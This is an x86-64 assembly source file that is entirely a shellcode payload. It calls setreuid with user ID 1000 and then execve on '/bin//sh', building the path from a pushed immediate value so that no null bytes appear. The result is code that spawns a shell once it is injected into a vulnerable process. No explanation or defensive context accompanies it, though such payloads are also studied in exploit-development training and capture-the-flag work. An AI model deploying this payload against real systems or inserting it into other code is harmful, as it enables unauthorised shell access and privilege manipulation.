bits 64
section .text
global _start

_start:
	
	; setreuid(1000, 1000)

	push 0x71
	pop rax ;  SYS_setreuid

	push rax
	pop rdi
	mov di, 1000
	push rdi
	pop rsi

	syscall 

	; execve("/bin/sh", NULL, NULL)
	xor rsi, rsi
	push rsi
	pop rdx

	push rdx
	mov rdi, 0x68732f2f6e69622f ; /bin//sh
	push rdi
	mov rdi, rsp

	push 0x3b
	pop rax ; SYS_execve
	syscall